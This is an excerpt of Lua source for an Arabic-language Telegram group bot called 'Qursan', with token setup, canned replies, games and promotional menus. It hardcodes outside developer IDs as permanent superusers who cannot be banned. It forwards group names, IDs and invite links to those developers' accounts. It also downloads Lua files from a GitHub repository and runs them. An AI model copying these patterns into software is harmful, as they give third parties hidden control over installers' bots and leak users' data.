...
io.write('\27[0;31m\n ارسل لي توكن البوت الان ●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━● :\na●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\n\27')
local token = io.read()
if token ~= '' then
local url , res = https.request('https://api.telegram.org/bot'..token..'/getMe')
if res ~= 200 then
print('\27[0;31m●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\n التوكن غير صحيح تاكد منه ثم ارسله')
else
...
print('\27[0;35m●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\n لم يتم حفظ التوكن ارسل لي التوكن الان')
end 
os.execute('lua DRAGON.lua')
end
if not database:get(id_server..":SUDO:ID") then
io.write('\27[0;35m\n ارسل لي ايدي المطور الاساسي ●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━● :\na●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\n\27[0;33;49m')
...
io.write('\27[1;31m ●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━● ارسل معرف المطور الاساسي :\n SEND ID FOR SIDO : \27[0;39;49m')
...
token = sudos.token 
--- start functions ●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●
------by-alex---- by--- alex ------byalex-------power-----soucer----alex
io.popen("mkdir File_Bot") 
io.popen("cd File_Bot && rm -rf commands.lua.1") 
io.popen("cd File_Bot && rm -rf commands.lua.2") 
io.popen("cd File_Bot && rm -rf commands.lua.3") 
io.popen("cd File_Bot && wget https://raw.githubusercontent.com/devboykaa/Qursan/main/File_Bot/commands.lua") 
...
sudo_users = {SUDO,1001132193,1906429231,1869163387,1695549459}   
...
var = true  
elseif tonumber(user_id) == tonumber(1906429231) then
var = true  
...
local UserName = (data.username_ or "S_79_Q")
...
sendAudio(msg.chat_id_,msg.id_,'./'..ffrr,"🎼˹《♡ 𝙌𝙐𝙍𝙎𝘼𝙉 ♡》˼")  
...
if text == "/start" then
if not DevSoFi(msg) then
local Namebot = (database:get(bot_id..'Name:Bot') or 'قرصان') 
local DRAGON_Msg = { 
...
if DevSoFi(msg) then
local bl = 'تم العودة إلي جميع الأقسام مره اخري 🌝'
local keyboard = {
...
local Text = ' ⦿تم ارسال الملصق من ●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\n - '..Name
...
os.execute('wget https://raw.githubusercontent.com/devboykaa/Qursan/main/DRAGON.lua')
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/source_Qursan/2107&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
send(msg.chat_id_, msg.id_,' ⦿ اصدار سورس قرصان{ 3x⦿}')
end
if text == '●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس Barlo0o ادخل وتابع الجديد](t.me/source_Qursan)
]] 
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '『 𝙌𝙐𝙍𝙎𝘼𝙉 』', url="t.me/source_Qursan"}}, 
{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
} 
local msg_id = msg.id_/2097152/0.5 
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/source_Qursan/2107' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
if text == '●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●' and DevSoFi(msg) then
local Text = [[ 
[قناه سورس Barlo0o ادخل وتابع الجديد](t.me/source_Qursan)
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
[CH](t.me/S_79_Q)مرحبا بك مطوري سأشرح لك كل شئ في لوحه الاوامر بالتفصيل
...
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = 'قناه السورس', url="t.me/S_79_Q"}}, 
{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
} 
local msg_id = msg.id_/2097152/0.5 
...
database:del(bot_id..'Srt:Bot') 
local Text = [[ 
 ⦿ من أحسن السورسات على التليجرام سورس قرصان ⦿
...
if text and text:match("^طرطوره$") or text and text:match("^طرطر$") or text and text:match("^طرطره$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1906429231,"🧞‍♂. اي ي طرطوره فيه حد عايزك يا طرطور \n🧞‍♂الشخص  {"..Name.."}\n🧞‍♂اسم الجروب {"..NameChat.."}\n🧞‍♂ايدي الجروب { `"..msg.chat_id_.."` }\n🧞‍♂رابط الجروب \n [ "..LinkGroup.." ]\n    🧞‍♂رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end

if text and text:match("^بويكا$") or text and text:match("^بويكا اليكس$") or text and text:match("^يا بويكا$") then
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
sendText(1869163387,"🧞‍♂. هناك شخص يريدك يا سيدي بويكا \n🧞‍♂الشخص  {"..Name.."}\n🧞‍♂اسم الجروب {"..NameChat.."}\n🧞‍♂ايدي الجروب { `"..msg.chat_id_.."` }\n🧞‍♂رابط الجروب \n [ "..LinkGroup.." ]\n    🧞‍♂رابط الرساله \n https://t.me/c/"..chatid.."/"..msg_id.."   ",0,'md')
end,nil)
end,nil)
end
...
print("it is Bot")
N = (database:get(bot_id.."Name:Bot") or "قرصان")
...
send(msg.chat_id_,0," ⦿ الـعـضو  : {["..data.first_name_.."](T.ME/S_79_Q)}\n ⦿ ["..DRAGON_Msg.."] \n")
end
end,nil)   
DeleteMessage(msg.chat_id_, {[0] = msg.id_})     
return false
...
send(msg.chat_id_,0, " ⦿ عذرا  ↜:{["..data.first_name_.."](T.ME/S_79_Q)}\n ⦿ عذرا تم منع الملصق \n" ) 
end
end,nil)   
DeleteMessage(msg.chat_id_,{[0] = msg.id_})       
return false   
...
{{text = '♪ ✈ • ضيف البوت ف بارك • ✈ •' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}}, 
}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendvideo?chat_id=' .. msg.chat_id_ .. '&video=https://t.me/F_R_M1/764&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end


if text == 'بويكا الكبير' or text == 'بويكا' or text == 'بويكا اليكس' or text == 'بويكا الكبير' or text == 'بويكا القمد' or text == 'بويكا مبرمج السورس' or text == 'بويكا الكبير' or text == 'بويكا القامد' or text == 'صاحب الابليكيشن' or text == 'فين بويكا'  or text == 'بويكا فين'   then
local Text = [[
ᴘʀᴏɢʀᴀᴍᴍᴇʀ 𝙱𝙾𝚈𝙺𝙰 𖡼
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/F_R_M1/728&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard)) 
end
...
local function taha(extra, taha, success)
if taha.photos_[0] then
local Name = '𓌹 🌝 ᯓ صانع العظمه يحوبي 🌝 𖣴 𓌺\n['..result.first_name_..'](t.me/barlo0o_bot)\n'
keyboard = {} 
keyboard.inline_keyboard = {
{
{text = '  ❨ '..result.first_name_..'  ❩ ',url="t.me/barl_lo0o0"},
},
{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},
}
local msg_id = msg.id_/2097152/0.5
...
if text == 'طرطر' or text == 'طرطور' then
local Text = [[
مطوره السورس وست البنات

]]
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '  ❨ 🧞‍♂ 𝐃𝐄𝐕 𝐓𝐀𝐑𝐀 🧞‍♂  ❩ ',url="t.me/W_UUA"}},
{{text = 'اضف البوت الي مجموعتك 🌚💞' ,url="t.me/"..dofile("./kkkklInfo.lua").botUserName.."?startgroup=start"}},

}
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/W_UUA&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end


if text == 'قرصان' or text == 'شهاب' or text == 'مطور السورس' then
local Text = [[
ᴘʀᴏɢʀᴀᴍᴍᴇʀ 𝚀𝚄𝚁𝚂𝙰𝙽 𖡼
ᴛᴏ ᴄᴏᴍᴍụɴɪᴄᴀᴛᴇ ᴛᴏɢᴇᴛʜᴇʀ 𖡼
ғᴏʟʟᴏᴡ ᴛʜᴇ ʙụᴛᴛᴏɴѕ ʟᴏᴡᴇʀ 𖡼
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '🧞‍♂ 𖡼 𝐐𝐔𝐑𝐒𝐀𝐍 𖡼 🧞‍♂',url="t.me/S_79_Q"}},
...
if text == "عايز بوت" then
if not DevSoFi(msg) then
local Text = [[
¤ سعر تنصيب البوت • 🌝
¤ علي سورس قرصان (20) فقط • 💸
...
keyboard = {}   
keyboard.inline_keyboard = {  
{{text = '  『 𝙌𝙐𝙍𝙎𝘼𝙉 』 ', url="t.me/barlo0o_bot"}},
...
"اكتب تاريخ مستحيل تنساه ",
  ...
  "فُرصه تتمنى لو أُتيحت لك ؟ ",
   "لي سورس قرصان رقم 1 علي التليجرام؟ ",
  "شيء مستحيل ترفضه ؟. ",
...
" لا تتجاهل قرصان مهما بدل ثيابه",
...
حمايه.سرعه.دقه وامان
 قناه السورس ⬇️
  [W𝙴𝙻𝙲𝙾𝙼𝙴 𝚃𝙾 ♡ 𝙌𝙐𝙍𝙎𝘼𝙉 ♡](http://t.me/source_Qursan)
]]
keyboard = {}  
keyboard.inline_keyboard = { 
{{text = '《♡ 𝙌𝙐𝙍𝙎𝘼𝙉 ♡》 ', url="t.me/S_79_Q"}}, 
...
if text == 'العاب قرصان' or text == 'العاب مطوره' or text == 'العاب متطوره' then  
local Text = [[  
 ⦿ اهلا في قائمه الالعاب المتطوره سورس قرصان ⦿ 
...
local Groups = database:scard(bot_id..'Chek:Groups')  
if AddChannel(msg.sender_user_id_) == false then
local S_79_Q = database:get(bot_id..'text:ch:user')
if S_79_Q then
send(msg.chat_id_, msg.id_,'['..S_79_Q..']')
else
...
if tonumber(result.sender_user_id_) == tonumber(1906429231) then  
...
send(msg.chat_id_, msg.id_, "عذرآ لـآ يمكن حظر المبرمج قرصان عام 🚫")
return false 
end
...
function(arg,data) 
usertext = '\n ⦿ العضو ← ['..data.first_name_..'](t.me/'..(data.username_ or 'S_79_Q')..')'
...
if result.id_ == tonumber(1906429231) then
...
usertext = '\n ⦿ العضو ← ['..result.title_..'](t.me/'..(username or 'S_79_Q')..')'
status  = '\n ⦿ تم حظره عام من {'..Groups..'} مجموعه'
texts = usertext..status
...
if tonumber(userid) == tonumber(1906429231) then  
...
if tonumber(result.sender_user_id_) == tonumber(1001132193) then  
send(msg.chat_id_, msg.id_, "لا يجوز كتم قرصان عام لانه هكر 🌚😹")
return false 
end
...
if DevSoFi(msg) then
local Get_Files, res = https.request("https://raw.githubusercontent.com/devboykaa/Qursan/main/getfile.json")
if res == 200 then
local Get_info, res = pcall(JSON.decode,Get_Files);
vardump(res.plugins_)
if Get_info then
local TextS = "\n ⦿ اهلا بك في متجر ملفات قرصان\n ⦿ ملفات السورس ●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\n●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\n\n"
local TextE = "\n●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\n ⦿ علامة تعني { ✔️ } ملف مفعل\n ⦿ علامة تعني { ✖ } ملف معطل\n ⦿ قناة سورس قرصان●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\n".." ⦿ [اضغط هنا لدخول](t.me/S_79_Q) \n"
local NumFile = 0
...
local json_file, res = https.request("https://raw.githubusercontent.com/devboykaa/Qursan/main/File_Bot/"..file)
if res == 200 then
os.execute("rm -fr File_Bot/"..file)
send(msg.chat_id_, msg.id_,t) 
dofile('DRAGON.lua')  
else
send(msg.chat_id_, msg.id_," ⦿ عذرا الملف لايدعم سورس قرصان\n") 
end
return false
end
...
if text == ("مسح قائمه قرصان") and Sudo(msg) then
database:del(bot_id..'CoSu'..msg.chat_id_)
send(msg.chat_id_, msg.id_, '\n ⦿ تم مسح قائمه قرصان')
return false
end

if text == 'قائمه قرصان' and Sudo(msg) then
...
database:sadd(bot_id..'Zahf:User'..msg.chat_id_, result.sender_user_id_)
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
usertext = '\n ⦿ الـعـضو   ↜:['..data.first_name_..'](t.me/'..(data.username_ or 'S_79_Q')..')'
...
send(msg.chat_id_, msg.id_, t..'●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●\nاضغط علي الاسم ليتم نسخه\n●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●ٴ\n ⦿ ❲[˹《♡ 𝙌𝙐𝙍𝙎𝘼𝙉 ♡》˼ ](t.me/S_79_Q)❳ ⦿ ')
end
...
if text == ""..(database:get(bot_id..'Name:Bot') or 'قرصان').."" then  
Namebot = (database:get(bot_id..'Name:Bot') or 'قرصان')
local DRAGON_Msg = {
'نعم يروحي♥️🙈',
'نعم يا قلب  '..Namebot..'',
'عاوز اي من '..Namebot..'',
'دوختو  '..Namebot..'',
'انت تعرف انو بوت  '..Namebot..'  متنصب علي سورس قرصانو🙈♥️',
'بتشقط وجي ويت 🤪',
'ايوا جاي 🙈',
'يعم هتسحر واجي 😾',
...
if text == "حذف رد عام" and DevSoFi(msg) or text =="مسح رد عام"  and DevSoFi(msg) then 
if AddChannel(msg.sender_user_id_) == false then
local textchuser = database:get(bot_id..'text:ch:user')
if textchuser then
send(msg.chat_id_, msg.id_,'['..textchuser..']')
...
end --الكود حصري سورس قرصانيعني لو بكتهن راح اعرفك انت الاخذتهن
...
-------------------------------
if text == ""..(database:get(bot_id..'Name:Bot') or 'قرصان').." غادر" or text == 'غادر' then  
...
send(msg.chat_id_,msg.id_, '[نت مطوري تاج راسي 😊](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مطوري الثاني حته مني 😍💚](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت المطور بس الصغنن 🌝💘](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[نت المالك هن يعني حاجه فوق فوف راسي 😂♥](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت منشئ يسطا عتلاء منشئ عاوز حاجه تانيه😹🤦‍♂️](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت هنا منشئ اساسي يعني اعلى رتبه عاوزك تفتخر😂🎯](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت المدير يعني الروم تحت سيطرتك😹](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد ادمن اجتهد عشان ياخد رتبه😹 ](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[ انت مميز ابن ناس 😊 ](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انت مجرد عضو زليل حقير ملوش لزمه 😂](t.me/S_79_Q)')
return false
end
...
send(msg.chat_id_,msg.id_, '[مع الف سلامه يقلبي متجيش تاني..😹💔🎶](t.me/source_Qursan)')
return false
end
...
send(msg.chat_id_,msg.id_, '[باي..😺💜](t.me/source_Qursan)')
return false
end
...
send(msg.chat_id_,msg.id_, '[خدوني معاكم برايفت والنبي..🥺💜](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عليه الصلاه والسلام..💛🙂](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[نزل عينك تحت كدا علشان هتخاد علي قفاك..⦿♥️](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انت الي حلو ياقمر..♥️🦋](t.me/source_Qursan)')
return false
end
...
send(msg.chat_id_,msg.id_, '[انا عايز مح انا كمان 🥺💛](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وحيات امك ياكبتن خدوني معاكو بيف...🥺💔](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بتعيط تيب لي طيب..😥](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[ونجيب اشخاص ...😂😜](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[بـعشـقق .🥰❤️](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[وعليكم السلام ..🖤⦿](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[خخخ امال ..??](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[قامد قموده ..🌝♥️](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[انا اجمد ..⦿💕](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هروح ..😹👻](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[مش هتيجي مش هروح ..😹👻](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[الود كبر وبقي عندو بنت ..😻💥](t.me/source_Qursan)')
return false
end
end
end
...
send(msg.chat_id_,msg.id_, '[عندو كام سنه ..😹💥](t.me/source_Qursan)')
return false
end
end
end
...
keyboard.inline_keyboard = {
{
{text = '𖣴 ٰ⠇ٰ‌أوامر الوضع ٖ⠇ٰ‌𖣴', callback_data="/help3"},{text = '𖣴 ٰ⠇ٰ‌التنزيل والرفع ٖ⠇ٰ‌𖣴', callback_data="/help4"},
},
{
{text = '𖣴 ٰ⠇ٰ‌أوامر المطورين ٖ⠇ٰ‌𖣴', callback_data="/help5"},{text = '𖣴 ٰ⠇ٰ‌أوامر الأعضاء ٖ⠇ٰ‌𖣴', callback_data="/help6"},
},
{
{text = '⇊𖣴 ٰ⠇ٰ‌أوامر التسليه ٖ⠇ٰ‌𖣴⇊', callback_data="/help7"},
},
{
{text = '𖣴 ٰ⠇ٰ‌قفل وفتح ٖ⠇ٰ‌𖣴', callback_data="/help1"},{text = '𖣴 ٰ⠇ٰ‌تعطيل وتفعيل ٖ⠇ٰ‌𖣴', callback_data="/help2"},
},
{
{text = '《♡ 𝙌𝙐𝙍𝙎𝘼𝙉 ♡》', url="t.me/S_79_Q"},
},
...
[🎯 ألعاب سورس قرصان الأفضل في التليجرام •]
...
keyboard.inline_keyboard = {
{
{text = '⚡ ⠇ٰ⁦ألُِعٍآبَ آلُِسوُرٍس ٖ⠇ٰ ⚡', callback_data="/mute-name"},{text = '⚡ ⠇ٰ⁦آلُِمميزْآت ٖ⠇ٰ⚡', callback_data="/change-photo"},
},
{
{text = '⚡⠇ٰ⁦ألُعٍآب بآرٍلُۆ آلُمتطُۆرٍہ ٖ⠇ٰ⁦⚡', callback_data="/sofi"},
},
{
{text = '⚡⠇ٰ⁦آلُـِـِِـِِِـِِـِـأوُآمـْـْْـْر ٖ⠇ٰ⁦⚡', callback_data="/help90"},
},
{
{text = '《♡ 𝙌𝙐𝙍𝙎𝘼𝙉 ♡》', url="t.me/S_79_Q"},
},
...
local msg_id = msg.id_/2097152/0.5
https.request("https://api.telegram.org/bot"..token..'/sendPhoto?chat_id=' .. msg.chat_id_ .. '&photo=https://t.me/swry00/17&caption=' .. URL.escape(Text).."&reply_to_message_id="..msg_id.."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
end
...
local Teext =[[
● ℻🔰 آهـلُِآ بَڪ فُي قٌسم آلُِأوُآمرٍ 🔰℻ ●

● ℻⚡أخـترٍ آلُِأوُآمرٍ آلُِذَي ترٍيدِهـآ⚡℻ ●
...
keyboard.inline_keyboard = {
{
{text = '𖣴 ٰ⠇ٰ‌أوُآمرٍ آلُِحٍمآيه ٖ⠇ٰ‌𖣴', callback_data="/help1"},{text = '𖣴 ٰ⠇ٰ‌أوُآمرٍ آلُِتسلُِيه ٖ⠇ٰ‌𖣴', callback_data="/help7"},
},
{
{text = '𖣴 ٰ⠇ٰ‌أوُآمرٍ آلُِآعٍضآء ٖ⠇ٰ‌𖣴', callback_data="/help6"},{text = '𖣴 ٰ⠇ٰ‌آوُآمرٍ آلُِمطُوُرٍين ٖ⠇ٰ‌𖣴', callback_data="/help5"},
},
{
{text = '⇊𖣴 ٰ⠇ٰ‌أصحٍآب آلُرٍتب ٖ⠇ٰ‌𖣴⇊', callback_data="/help2"},
},
{
{text = '˹《♡ 𝙌𝙐𝙍𝙎𝘼𝙉 ♡》˼', url="t.me/S_79_Q"},
},
...
local Teext =[[
🚨 اهلا بك في قسم الاوامر ..↑●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●
 اختر الامر الذي تريدها .↑●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●
ده من الازرار بلاسفل . ●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●
●━•⦿•⟞⟦ ℻ 𝙌𝙐𝙍𝙎𝘼𝙉 ℻ ⟧⟝•⦿•━●
 ❲[˹《♡ 𝙌𝙐𝙍𝙎𝘼𝙉 ♡》˼ ](t.me/S_79_Q)❳ 
]]
keyboard = {} 
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝐁𝐎𝐔𝐊𝐀 𝐔𝐒𝐄𝐑',url="t.me/uu_boy"}},
{{text = '•الــقــنــوات♪', callback_data="/Ajobanf"},{text = '•الــبــارات♪', callback_data="/banfai"}},  
{{text = '•الــبــوتــات♪', callback_data="/gqjik"}},
}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '⌯ ˹قناة السورس',url="t.me/uu_van"},{text = '⌯ ˹بوستات˼',url="t.me/koky_boyka"}},
{{text = '⌯ ˹قناة افلام عربي˼',url="t.me/aflami01"},{text = '⌯ ˹قناة افلام انجليزي˼',url="t.me/aflame02"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/banfai' then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '™✹ 𝐅𝐀𝐌𝐈𝐋𝐘 𝐀𝐋𝐄𝐗 ✹',url="t.me/bar_boyka"}},
{{text = '✹ ᏟᎻ • ᏙᎪΝ ✹',url="t.me/uu_van"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𖣐 بوت التواصل 𖣐',url="t.me/B_o_y_k_a_02_bot"}},
{{text = '𖣐 بوت داني 𖣐',url="t.me/B_o_y_k_a_bot"}},
{{text = '𖣐 بوت صنع ليسته 𖣐',url="t.me/B_o_y_k_a_03_bot"}},
{{text = '𖣐 بوت المسابقات 𖣐',url="t.me/Lovechbbot"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/bnada-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '✹ 𝐂𝐇 • 𝐐𝐔𝐑𝐒𝐀𝐍 ✹',url="t.me/source_Qursan"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/tafa-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/taffai' then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '™✹ 𝐅𝐀𝐌𝐈𝐋𝐘 𝐐𝐔𝐑𝐒𝐀𝐍 ✹',url="t.me/TEAMELQURSAN"}},
{{text = '✹ 𝐂𝐇 • 𝐐𝐔𝐑𝐒𝐀𝐍 ✹',url="t.me/source_Qursan"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/tafa-yquio"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𖣐 بوت تارا 𖣐',url="t.me/E_h_a_b_bot"}},
{{text = '𖣐 بوت صنع ليسته 𖣐',url="t.me/B_o_y_k_a_03_bot"}},
{{text = '𖣐 بوت المسابقات 𖣐',url="t.me/Lovechbbot"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/tafa-yquio"}},
}
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '𝚀𝚄𝚁𝚂𝙰𝙽 𝚂𝙾𝚄𝚁𝙲𝙴⤶', url="t.me/source_Qursan"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/HHH"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
end
if Text == '/units' then
...
keyboard = {} 
keyboard.inline_keyboard = {
{{text = '•𝐃𝐄𝐕 𝐁𝐎𝐘𝐊𝐀♪',url="t.me/uu_boy"},{text = '•𝐃𝐄𝐕 𝐐𝐔𝐑𝐒𝐀𝐍♪', url="t.me/S_79_Q"}},
{{text = '•𝐃𝐄𝐕 𝐓𝐀𝐑𝐀↵', url="t.me/W_UUA"}},
{{text = '🧞‍♂𝐁𝐀𝐂𝐊↵', callback_data="/HHH"}},
}
return https.request("https://api.telegram.org/bot"..token..'/editMessagecaption?chat_id='..Chat_id..'&caption='..URL.escape(Teext)..'&message_id='..msg_idd..'&disable_web_page_preview=true&reply_markup='..JSON.encode(keyboard))  
...
if Text == '/add' then
local Teext =[[
🎮 اهلا بك في قسم الالعاب ..↑⟦᪣𝙌𝙐𝙍𝙎𝘼𝙉᪣⟧
🕹 اختر العبه الذي تريدفي الاسفل ..↑⟦᪣𝙌𝙐𝙍𝙎𝘼𝙉᪣⟧
╾╾╾╾╾╾╾╾╾╾╾╾╾╾╸
 ❲[˹《♡ 𝙌𝙐𝙍𝙎𝘼𝙉 ♡》˼ ](t.me/S_79_Q)❳ 
]]
keyboard = {} 
...
local Name_Bot = (database:get(bot_id..'Name:Bot') or 'قرصان')
